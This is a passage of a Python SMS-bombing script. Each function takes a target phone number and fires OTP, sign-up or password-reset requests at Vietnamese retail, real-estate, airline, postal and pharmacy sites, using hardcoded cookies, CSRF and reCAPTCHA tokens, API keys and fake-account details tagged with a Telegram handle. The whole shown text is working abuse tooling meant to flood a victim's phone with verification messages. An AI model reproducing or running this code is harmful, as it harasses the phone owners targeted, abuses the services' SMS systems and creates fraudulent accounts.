jwfj4tmjcmcyEvqa5b2DBDiHsvwagbReRN9OqY4M5Uwi4vZLAqvZ792VRCQZTWt8A",
        "recaptcha_verify_only": True
    })

    payload2 = json.dumps({
        "account_phone": phone,
        "recaptcha_token": "03AFcWeA7TqXwWbPgqj2nA8CAjgsOPLORFhHYqmxwABzbb676LvJ2HO5IVkjfi2wCzmQW-nDkfJZX8HfbrTZUiLoK7l54RXwU4VrIJHZ0TKkrlrZ5x3SkuwhOz7td0HvROIvNDbXiZYYZP9JnN50i3frQ12z4cTUuITG8NyG3g2Fl8NAlEvDPHIOk1upYMv_fNDYTVzCsS-hlKEkLg-S91qhzEhx8Vd_d5esXD5xP2Y7PsBC5ynDJjNd3SDef-Ga3gM8MTQUrwBt6DrSKN7wd2iqB7u3LAocktvSxiWQdgOEx05BlQy8QBboMx1jkhMsR1BwMRXLM9y0cooGgkDXZqOIjnle1-8fNzLY4f6PZt1919e_rVVDmGkI6dVm4DJrtMqNOc8GNdvMhmG_sTgYBxp691xakqqPCKdKQRdkEc2BDnjXbzEaQARzOEDe1OwHEjQAQJ7DovCs65P4IdT9MGThjJgS-4hkME_Hxz9m7wrnjlVjMPqT8eQDBZCRsk6qC1JFiUefENSBZst8t6MPSj5lCbCBQKUmZg42Vsn0VtgfdLXqRk_KQLkPpKHY1mYt0qYpxfYhRUtik6DK8WJXfJ3vZ_l8T42KKcjkoY7m6jZcY6cB7mNwh1S0e8nPLARBupK4Z0ssi0dsz0AZIm4C_eloO2Eb1Bcafx2DW3aXV0ugnqiJQIJGoZQ4yA2duiDM22SLggjFQVCzi0_EYRYYCI7S5uZyTgxNBZAhOfnjRvppi8RJ-V-d3MNOBu1zLWHq4sAMwtbnMVPOPBmpv4z3l9Xwum8-84pR5yTWJZu3A2A8VnIb26A64BfRs3VAOTvy5p6bpTNnrWfDnsAMeBbKnMr4hWrqigftxiTgfKF27fJqh2_Q2CijZQxkY58Ud7-cC9rmZMlmYHvlmHXtha_ZG87aOXG8gwp_e5YNNLsPRv57oUGABi8zwhKqueWjT8bnBgdi2l1TDA5U_qloCxKUozUuz5d2xU6JK62PH-fu0WJE9qd1H5gu_cptImos2c5TbOT3aCpANgtC-A-vd9v9ihhvgBuEOICFq4llEy_9mPk2iWwqCiDNj4prQIzHuyDA2xaZjdcPd4PBRepfTaucKNF1H9QFDEyk2gsdIE5N6YiFRbJ4c5ZDobB5qGB7LLJqjmC3qNAiLuzKuDhjgOYboUcsM31PPHRcb3OTWzwr0nZKHoQweXXJYWxUA4S4SwWpxLOsknB_L-tfbDz0394Kgwxc6pFbeH-n8qAFTjmkaFqAkXRw5IGKuQyEct0KIILbT9IArlN6IX6i-MnW1rWDsrW710Z1ZJYsWrMs1CyQW8ItRwFUwLDmNrq6DW__aggkE0haDm8IX06KEyan71QyhRM6Pf8PdilscLKWGB2mTLPNMsLlmXQI3G9g4cM155CJPsxcKPO-OwIAysnHBGExPcNbSyFYult9ElBocfmTIZ-ETXyrAPfKAtMrLl36VHp8sGtj6lfP9pjic4ywsTYyWb5bcz5dtDvsm0lqIVwHGOAEGlL-RGI3_BLRHB1DfM0hA5UxFCHFMfKpH_dO2b6lXKDj9U-nMrfU8_CVR857y-fekEFcLGJZpeKCYBjqxcp6X45G1UukJDQXzmUY-r4Xkkscimn04fFRKPOEWj4JLvHYX1VYXv9_iAgMhpc3GtidLuIR1iFylXFpPKTW9TyNpDOZMsoR-xEo8E6-xMtaOFQq_9DVYGhg5wGYm5xmRlsd_H4Lw1c6BQRxOW60xe-DHiuwTGFZXqdtx_jq3Fi6EBpQQ0rsjuy6_mWVSmzTlfv5qmkthx1rSqW4zVpbAnmz1DLTdyF61GQkOlbh6puDE5OTiXhmBco0R-NIGEldH7N2xNP8rE3D17-BBxXXxUoEttzUzMLlbpfK5PnHljmy7ZOphuUc7rmRYzxj8K7x_s59t8CrnsJ7LiHJmJJSCBd4gdHP4VxK-gcPHGF42EXRMo5fsCASJJOnJ4bTTqWZ6YSdx11lVjuaacYzW4NHBalRYG58rjUuIL6hWNyTUPN__E6jVDGcPGBNik-2I",
        "recaptcha_verify_only": True
    })
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "sec-ch-ua-mobile": "?1",
        "baggage": "sentry-environment=production,sentry-public_key=946391eeaa4b47f6aab796fd7f0ec179,sentry-trace_id=3a19c1d9f3944aa2878077f98c601de7",
        "sentry-trace": "3a19c1d9f3944aa2878077f98c601de7-82dd49d3d386dd65",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.thitruongsi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.thitruongsi.com/",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "x-xsrf-token": "YH6WttFiaAxl6MkF3BDmdHEe4LQPAzrpFAOArlna",
        "sec-ch-ua-mobile": "?1",
        "viewport-width": "400",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.thitruongsi.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.thitruongsi.com/user/password/mail",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cookie": "tts_analytics_guest_id=JlTF2lg3k6c8_8XlCeUuJ; XSRF-TOKEN=YH6WttFiaAxl6MkF3BDmdHEe4LQPAzrpFAOArlna; laravel_session=20MdJaO6RqScHOnCQynK9MUGcvCGFaoJvXWJh3EH; _gcl_au=1.1.788228167.1716206269; _ga=GA1.1.492476258.1716206270; _hjSession_1750246=eyJpZCI6IjYzYTgwZjg4LWY5YjItNDk3ZS1hMDYxLTUwY2M0YWIyMGRjYyIsImMiOjE3MTYyMDYyNzExNjEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1716206271264.726982895; tts_notify_request=true; _hjSessionUser_1750246=eyJpZCI6IjM3NjlhOTdkLTUwMGQtNWYzOS1hZWFkLTFjN2RhYjk4M2EzNyIsImNyZWF0ZWQiOjE3MTYyMDYyNzExNDIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_NNW7MWHV9W=GS1.1.1716206270.1.1.1716206425.50.0.0"
    }
        
    response = requests.post(url, data=payload, headers=headers)
        
    if response.status_code == 422:
        response = requests.post(url2, data=payload2, headers=headers2)
def bds_live(phone):
	url = "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister"

	params = {
		"phoneNumber": phone
	}
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://batdongsan.com.vn/sellernet/trang-dang-ky",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "con.ses.id=ede62ec1-5869-42fa-a25b-2a82f5681add; _cfuvid=pnGURJA6AjbX2behAjLVAjDrA0foM5Gl6rf1IrlYWXQ-1716206807321-0.0.1.1-604800000; _gid=GA1.3.1122086402.1716206816; _gat_UA-3729099-1=1; _tt_enable_cookie=1; _ttp=h3iKvuCclRL-MmhoBdthY55HV6H; __gads=ID=3556c5d3404f5e64:T=1716206823:RT=1716206823:S=ALNI_Mae_7FHcq5r3kk9wjuJ8OCXCM09nA; __gpi=UID=00000e250d3b27b3:T=1716206823:RT=1716206823:S=ALNI_MZaRZIqqYVIIrVOy6s8SExUj1Un5A; __eoi=ID=2b6c305344e4ae11:T=1716206823:RT=1716206823:S=AA-AfjYrXYNnomyUSIWR2Cd_kENT; _hjSession_1708983=eyJpZCI6IjQ3Y2U3OTY5LTlmNGEtNDc1ZS1iNTM5LTVmZDBhODdjYWNjYiIsImMiOjE3MTYyMDY4MjM5NDksInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; cf_clearance=B98t.pUSClHYWlBLIKaCJfktCcHy2Hse1050S819gEU-1716206826-1.0.1.1-eyCJNlJIF4eH5OaqSzU4APo9GURAVZhUP_tMwlQkdP0hEXEwbw1sLOqnEYTQ7bRyarzP6RVRUXBGBYfSO_ILSg; _gcl_au=1.1.1476705456.1716206827; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%22b8117909-86ba-4b0f-91a2-84424cf9460a%22%2C%22expireDate%22%3A%222025-05-20T19%3A07%3A07.3667265Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22fab4b619-9ada-4491-8a80-7c91ca2cea78%22%2C%22expireDate%22%3A%222025-05-20T19%3A07%3A07.3667711Z%22%7D; _fbp=fb.2.1716206827274.1622498093; desapp=sellernet01; SERVERID=64; __zi=2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUz_F4J47VO9FrziS8GTrYsVNum0r6qZ8oC0.1; _ga=GA1.3.791460359.1716206816; _hjSessionUser_1708983=eyJpZCI6ImFmMGI5MmU4LTJjN2ItNTBhZS04NDkwLTY2NWJhZjY0YWNlMyIsImNyZWF0ZWQiOjE3MTYyMDY4MjM5MzYsImV4aXN0aW5nIjp0cnVlfQ==; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22ec0d7621-429e-c9d1-1246-f9799d38059b%22%2C%22c%22%3A1716206847070%2C%22l%22%3A1716206847070%7D; _ga_HTS298453C=GS1.1.1716206816.1.1.1716206847.29.0.0"
	}
		
	response = requests.get(url, params=params, headers=headers)
def fmp_live(phone):
	url = "https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2"
	
	payload = {
		"Phone": phone,
		"LatOfMap": "106",
		"LongOfMap": "108",
		"Browser": "",
	}
	
	headers = {
		"accept": "application/json, text/plain, */*",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"authorization": "Bearer",
		"content-type": "application/json;charset=UTF-8",
		"origin": "https://fm.com.vn",
		"priority": "u=1, i",
		"referer": "https://fm.com.vn/",
		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "cross-site",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"x-apikey": "X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv",
		"x-emp": "",
		"x-fromweb": "true",
		"x-requestid": "03f0f69d-77ff-4484-b322-e2f22d42f208",
	}
	
	response = requests.post(url, headers=headers, json=payload)
def vtpost_live(phone):
	url = "https://id.viettelpost.vn/Account/SendOTPByPhone"
		
	payload = f"FormRegister.FullName=Nguy%E1%BB%85n+Duy+&FormRegister.Phone={phone}&FormRegister.Password=Telegram%3A%40vrxx1337&FormRegister.ConfirmPassword=Telegram%3A%40vrxx1337&ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dvtp.web&ConfirmOtpType=Register&FormRegister.IsRegisterFromPhone=true&__RequestVerificationToken=CfDJ8BOZRMrMu_tIjS_ed0sLA6yfEmjsWyyGSrHYsd9aAbYWE9HtNVvEa53zDQZdNEOukLsVwRuSK49_fBd1gQs_YFCMDqk0Th9HGeWYWKKcURkoqR9SM-jNuSb4tZQ40UIusBCvBSHcu6RBnm4PPTBjHUY"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Content-Type": "application/x-www-form-urlencoded",
		"Cache-Control": "max-age=0",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Upgrade-Insecure-Requests": "1",
		"Origin": "null",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "navigate",
		"Sec-Fetch-User": "?1",
		"Sec-Fetch-Dest": "document",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "_gid=GA1.2.910076070.1716218686; _ga_9NGCREH08E=GS1.1.1716218685.1.0.1716218689.56.0.0; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8BOZRMrMu_tIjS_ed0sLA6zUVdAF9pA9xSIce0VW0IEMPFamISJ8uiv82Ii6AnWNgEh0S5mbItGULzIgKG8NXJ3AkrZoyTpZt5w7FfGqjNiQ-C0K1-VnAlSDvKp6VMpLSjpniGFbHNxDpsapOhXPGXQ; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1716218697.1.1.1716219102.0.0.0; _ga=GA1.1.2078827937.1716218686; _ga_WN26X24M50=GS1.1.1716218699.1.1.1716219102.0.0.0; _ga_P86KBF64TN=GS1.1.1716218700.1.1.1716219123.0.0.0"
	}
		
	requests.post(url, data=payload, headers=headers)
def vietair_live(phone):
    url = "https://vietair.com.vn/Handler/CoreHandler.ashx"

    payload = f"op=PACKAGE_HTTP_POST&path_ajax_post=%2Fservice03%2Fsms%2Fget&package_name=PK_FD_SMS_OTP&object_name=INS&P_MOBILE={phone}&P_TYPE_ACTIVE_CODE=DANG_KY_NHAN_OTP"
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vietair.com.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vietair.com.vn/khach-hang-than-quen/dang-ky",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cookie": "_gcl_au=1.1.749309239.1716223603; _gid=GA1.3.1954334173.1716223604; set-show-banner-app=true; counter-show-banner-app=0; _tt_enable_cookie=1; _ttp=ZcF7f0Y61ZgUD6P8HIi65cWwxho; _fbp=fb.2.1716223627581.2060308024; _dc_gtm_UA-46676256-1=1; _ga=GA1.1.1362514480.1716223604; _ga_R4WM78RL0C=GS1.1.1716223604.1.1.1716223786.55.0.0"
    }
        
    response = requests.post(url, data=payload, headers=headers)
def mutosii_live(phone):
	url = "https://api-omni.mutosi.com/client/auth/register"
	url2 = "https://api-omni.mutosi.com/client/auth/reset-password/send-phone"
	
	payload = json.dumps({
		"name": "Lê Quốc Việt",
		"phone": phone,
		"password": "Telegram@vrxx1337",
		"confirm_password": "Telegram@vrxx1337",
		"firstname": None,
		"lastname": None,
		"verify_otp": 0,
		"store_token": "226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
		"email": f"vrxxdev{random.randint(1, 999)}@gmail.com",
		"birthday": f"2001-0{random.randint(1, 9)}-{random.randint(10, 29)}",
		"accept_the_terms": 1,
		"receive_promotion": 1
	})
	
	payload2 = json.dumps({
		"phone": phone,
		"token": "03AFcWeA4W59pirg8OXzAOI2Bh55nLRuKgRkRc8sqRTov__qcJwUZ72iyyBgjMXhgCChrKf54tPzpvOG--I6Lefq54JdoZvQPr3wJRyrRID5UU_uogKC-qB3KPPX0i89q_RSx3F706J9RG2rNByywGoSUJQwomtSG1PlR6tFeM-Z8gvncmpDZwKDFMR7iip8IWjZRKk1o9YKOZ95LX6ep1Ieb7H85bvlOTHA3HYnhhdlOOhRniFCbnRgWq3BZeI9whO5Wzfwam0gulyWdX7arHeyRg7JP9ws5yCUHtjiLAr96CLampR04IGE9ltN35qjwifqkOlpzpEWDMXPR_ZfuQ-t00KvORV9WXPJ9MiKguMOtXlaHbgae1G7ER9wbBCPSrknvNWFPrUH0R6hj1OXEtN1-ChtYeyCroScrOOfUty0dTV6zr7Ds1EIFcvFePT4Lnz8Kzz1oR2DPMvdaSXGdhANtvVw6m6sCnqW9QuZ1q7eddWkBsGa4xKJcccwJRliWbDWZXqHV5zn-IUcft4gwXujv9b6vpl07_tfXXytWSWIsSLfHrMUcDheDbMmUxdxpoQrrGFiJUvtfBlv8ijhPFhAernAwDW1RVhRLVtZ93amYP9CdzfG9xHwdICqshWTR-_L8MxteMGv8y5zTDybH5XlNT2Ks7RFqMakuP9LYPtaPfE6EQnsb6Z8E",
		"source": "web_consumers"
	})
	
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://mutosi.com",
		"Sec-Fetch-Site": "same-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://mutosi.com/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://mutosi.com",
		"Sec-Fetch-Site": "same-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://mutosi.com/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3"
	}
	
	requests.post(url, data=payload, headers=headers)
	response = requests.post(url2, data=payload2, headers=headers2)
def tokyolife1_live(phone):
	url = "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register"
	url2 = "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/forgot-password"

	payload = json.dumps({
		"phone_number": phone,
		"name": "Nguyễn Duy",
		"password": "@vrxx1337",
		"email": f"vrxxdev{random.randint(1, 999)}@gmail.com",
		"birthday": "2001-01-01",
		"gender": random.choice(["male", "female"])
	})
	
	payload2 = json.dumps({
		"phone_number": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"timestamp": "1716263773508",
		"signature": "218c64573564a4e6be914b4a85e3ec55",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://tokyolife.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://tokyolife.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"timestamp": "1716264027567",
		"signature": "ed9dd00052e6b2d40efac169217d7739",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://tokyolife.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://tokyolife.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
		
	if response.status_code == 400:
		response = requests.post(url2, data=payload2, headers=headers2)
def nhathuockhanglive(phone):
    url = "https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode"

    payload = f"phoneNumber={phone}&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8NJ72x-heHlJrMocXFWhvq7MuAMwPk1UH9-tms4I4JoAfe2Rb76O5SFZTOjFJa4WAHTfXmtlRI4wAuwvdpTr9CPqCxuNz8NI0u5b0Ula-MtLDMDEQ4C5CHijrHd_sJOne8tLVN9DfeXIgnca4GDNPNY"
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://www.nhathuocankhang.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
        "Cookie": "TBMCookie_3209819802479625248=847653001716289020T7V5V1TeShQHIWKPz3qNRnsDWHc=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; MWG_PRODUCT_BASIC_DB=DE4ygO04CfNd2JjrY3mvduulhlBOKDk7n%2FBEhZUkls7NaXazSu6hFw--; MWG_CART_HAVE_PRODUCT=; MWG_CART_SS_10=CfDJ8HZNRTNecMlMtUbgpGOP26wZHV2FDz2MrJTsTmIGpf%2BWkh6nZLDjaSfJT2m3pgzTzrWGX9KpA1RIhZXRSsJLaKDyFuQdLW7Z1VXC8sjLj7wOQb1FWf2EVWKYNu7%2FkPepKdpPIIQKQddXFyJ9WLRjRGTr9978skTHT0LFnujZcEDC; _gcl_au=1.1.681993383.1716289024; _pk_ref.2.b94a=%5B%22%22%2C%22%22%2C1716289024%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.2.b94a=3bbe8f00cd296967.1716289024.; _pk_ses.2.b94a=1; _ga=GA1.1.93519431.1716289025; _fbp=fb.1.1716289025612.1438656724; __zi=3000.SSZzejyD5jOgdlk_qHeVpIwL-x_TN1tC99cqyi0I4zHdnQRutm1Hnd7LvwUP0LgEETVie9q05Oq-rg2WcGCGX3tHhAu.1; .AspNetCore.Antiforgery.4PZsHduyjpg=CfDJ8NJ72x-heHlJrMocXFWhvq4ARyjM7w2eX9JmPTIEnhq8voQl2d0x2Dvjn2lXRdGe8QWgMiM1AO3eZu3IP2hnBKHLP_gS2cQWZK5qj96D7nDO8I01Is21ewGg9kywsl8N2e0Q6ayArzWsDIK446bsKik; _ce.irv=new; cebs=1; SvID=ak195|Zkx+C|Zkx9/; _ce.clock_event=1; _ce.clock_data=-886%2C116.105.221.247%2C2%2C72b9292105a9e001ee6314573aecd272%2CChrome%2CVN; cebsp_=1; _ga_D1DPPSN7B8=GS1.1.1716289024.1.1.1716289033.51.0.0; _ce.s=v~b49de53454b54fb60423c1eeb10cd8648196519b~lcw~1716289044798~lva~1716289026943~vpv~0~v11.cs~403690~v11.s~debf1a20-1760-11ef-8c27-7f9a4d942d9d~v11.sla~1716289044806~lcw~1716289044807"
    }

    response = requests.post(url, data=payload, headers=headers)
def chotto_live(phone):
    url = "https://gateway.chotot.com/v3/public/auth/register"
    url2 = "https://gateway.chotot.com/v2/public/auth/forget_password"

    payload = json.dumps({
        "phone": phone,
        "password": "Telegram@vrxx1337",
        "full_name": "Nguyễn Duy",
        "token": "03AFcWeA6vUe4kb87yVqKLlNCfOcGirjOdhpsGMqzOkbuhEULj-vEwNZAnIIwzYU_yYkvCeRi7_AKE0ccXb2DLWGN-wnsjBQDKlGOU60XxR6BcjRYkcoIXUakvWvgI0e9nLRdYXlasiLH1JcCvkbPAbICswvfN6fZJ30nd_wKp0Zl2Gr8tOj1kpE80qsjqzPcI7-MrfDJOu9jf3gkHNL3cLOCZk6gQWPquD1j8nFqyHu3UjckHkNQwjHwLAo2ck_0v8gWzGj885OtR4u3n_uvxGHXQPkxFbFrxoqxiN_YpY85wNKU_tOhZD1wpztf43w5r-7-sQqMzDWPFwRvxO8ZC7CNihMBwBYh96KCh7P5qKuRIZMsTUbhsV9o1uy8eLJ3YBlzzm4WAIKLhDI4-wvrmVIZNUUJBtHdwkAmPpR_VaP7gxQzTo1S8toLpTwjAyC_qEZsdyiHih-cFXHDFc1K_Bc9xfHcmEbulJ5O2Hdy6ZzAoRNnE004oVmrlXyIKC8aMqDVAC-IJKf7YlbMeQL6upIgDId-wTbgMjt1_Aea5Nf7VGJOhAHdn_vMLQlkJpzFG1E26SscEPjY9SPeyrUbwkyr-uikioQczF8tlbRf1rmAxawKjN24AB9KnVKN40Iy8RAo9cnv54W8gCEf3adT2buhi-G_H7GevgTdyDfKCbfuRuN1LQtnYTmLDC0oR3sMvwSP4klVrNXy0c7nfDE1yR3sr6kZ3UbUSt6yb2ZVLlWboOZSJNHS_jvmBhcilfW2koW9SX2nzsJY2Q0E-3dR301rxkjx6A_oYIyD8HU29RuUss22vaYnxvKD7-gjR2D4CFK65wY37TrhJGi1bhD4eBTsrAxjLfr6Wx6QwObCnHm36tqo3AwLaFC3nOf-rUgUi2US6r-dwTCAY5u_PxOU8DQJtIQbLK8fcwssVQWWXwrx6i3JABZegM8BgBL4jcLZNrXcfd10zHD24IwYFpboQFwlTGshQIxgEuvgDLXcgNjzrfeA-Cd_OTY13USPpHt3KzZLFmk_n-7_aLDnM1MRMaIArKMT6S4XgqjQCoQKCSbF5j9PQKCtzx4MPUCrHvMktAtYoFAvEZQTXHkEx1vP0T9XBrLkMomT0hP2si3uMZtNwKVoiDYWnWevUpbjT3piVl08QHG4CFTyR0g2Js6zplLBgpjmPlIvBxqVjNiFdmmJVIbcyd0CR0wX4DrdIosreUhE2IylWV6P9LcFmyGuIlJQTVW2qyYaUz6nP4vo0de39XWB0hgH-L84USXtyRKgdrnQ3H8uO4yBosDfMxyYnkr2oqeyBiQCeyx50nHe9TEHZGrw4wIyubZ